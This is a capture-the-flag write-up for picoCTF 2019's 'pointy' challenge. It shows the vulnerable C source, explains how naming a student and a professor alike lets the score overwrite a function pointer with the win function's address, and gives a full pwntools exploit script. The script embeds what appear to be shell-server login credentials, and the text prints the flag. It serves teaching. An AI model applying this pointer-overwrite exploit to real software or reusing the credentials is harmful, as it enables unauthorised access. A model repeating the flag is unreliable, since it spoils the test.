# Problem
Exploit the function pointers in this [program](https://2019shell1.picoctf.com/static/1a8c8077cf0c9b24e396ab5003a82630/vuln). It is also found in /problems/pointy_2_030e643c8a0e842516b1c6a3ff826144 on the shell server. [Source](https://2019shell1.picoctf.com/static/1a8c8077cf0c9b24e396ab5003a82630/vuln.c).

## Hints:

A function pointer can be used to call any function

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/1a8c8077cf0c9b24e396ab5003a82630/vuln
wget https://2019shell1.picoctf.com/static/1a8c8077cf0c9b24e396ab5003a82630/vuln.c
```

First, we investigate the source
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define FLAG_BUFFER 128
#define NAME_SIZE 128
#define MAX_ADDRESSES 1000

int ADRESSES_TAKEN=0;
void *ADDRESSES[MAX_ADDRESSES];

void win() {
    char buf[FLAG_BUFFER];
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    puts(buf);
    fflush(stdout);
}

struct Professor {
    char name[NAME_SIZE];
    int lastScore;
};

struct Student {
    char name[NAME_SIZE];
    void (*scoreProfessor)(struct Professor*, int);
};

void giveScoreToProfessor(struct Professor* professor, int score){
    professor->lastScore=score;
    printf("Score Given: %d \n", score);

}

void* retrieveProfessor(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void* retrieveStudent(char * name ){
    for(int i=0; i<ADRESSES_TAKEN;i++){
        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
            return ADDRESSES[i];
        }
    }
    puts("person not found... see you!");
    exit(0);
}

void readLine(char * buff){
    int lastRead = read(STDIN_FILENO, buff, NAME_SIZE-1);
    if (lastRead<=1){
        exit(0);
        puts("could not read... see you!");
    }
    buff[lastRead-1]=0;
}

int main (int argc, char **argv)
{
    while(ADRESSES_TAKEN<MAX_ADDRESSES-1){
        printf("Input the name of a student\n");
        struct Student* student = (struct Student*)malloc(sizeof(struct Student));
        ADDRESSES[ADRESSES_TAKEN]=student;
        readLine(student->name);
        printf("Input the name of the favorite professor of a student \n");
        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
        ADDRESSES[ADRESSES_TAKEN+1]=professor;
        readLine(professor->name);
        student->scoreProfessor=&giveScoreToProfessor;
        ADRESSES_TAKEN+=2;
        printf("Input the name of the student that will give the score \n");
        char  nameStudent[NAME_SIZE];
        readLine(nameStudent);
        student=(struct Student*) retrieveStudent(nameStudent);
        printf("Input the name of the professor that will be scored \n");
        char nameProfessor[NAME_SIZE];
        readLine(nameProfessor);
        professor=(struct Professor*) retrieveProfessor(nameProfessor);
        puts(professor->name);
        unsigned int value;
      printf("Input the score: \n");
      scanf("%u", &value);
        student->scoreProfessor(professor, value);       
    }
    return 0;
}
```

We can see that both ```Students``` and ```Professors``` are being searched by ```name```.
If we call both the student and the professor with the same name, the student will ```score``` himself and set his ```scoreProfessor``` pointer to an arbitrary value (the address of ```win```?). In the next round, this function will be called and we will get our flag.

Lets write a python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)

  s.set_working_directory('/problems/pointy_2_030e643c8a0e842516b1c6a3ff826144')
  p = s.process('./vuln')

binary = ELF('./vuln')

win_address  = binary.symbols['win']

log.info('Found "{}" address ({} = {})'.format('win', win_address, hex(win_address)))

print p.recvuntil('Input the name of a student\n')
log.info('Sending: {}'.format('a'))
p.sendline('{}'.format('a'))

print p.recvuntil('Input the name of the favorite professor of a student \n')
log.info('Sending: {}'.format('a'))
p.sendline('{}'.format('a'))

print p.recvuntil('Input the name of the student that will give the score \n')
log.info('Sending: {}'.format('a'))
p.sendline('{}'.format('a'))

print p.recvuntil('Input the name of the professor that will be scored \n')
log.info('Sending: {}'.format('a'))
p.sendline('{}'.format('a'))

# Redirect function pointer to 'win'
print p.recvuntil('Input the score: \n')
log.info('Sending: {}'.format(win_address))
p.sendline('{}'.format(win_address))

print p.recvuntil('Input the name of a student\n')
log.info('Sending: {}'.format('a'))
p.sendline('{}'.format('a'))

print p.recvuntil('Input the name of the favorite professor of a student \n')
log.info('Sending: {}'.format('a'))
p.sendline('{}'.format('a'))

print p.recvuntil('Input the name of the student that will give the score \n')
log.info('Sending: {}'.format('a'))
p.sendline('{}'.format('a'))

print p.recvuntil('Input the name of the professor that will be scored \n')
log.info('Sending: {}'.format('a'))
p.sendline('{}'.format('a'))

# Call 'win'
print p.recvuntil('Input the score: \n')
log.info('Sending: {}'.format(0))
p.sendline('{}'.format(0))

print p.recv()
```

Flag: picoCTF{g1v1ng_d1R3Ct10n5_cad9c1b8}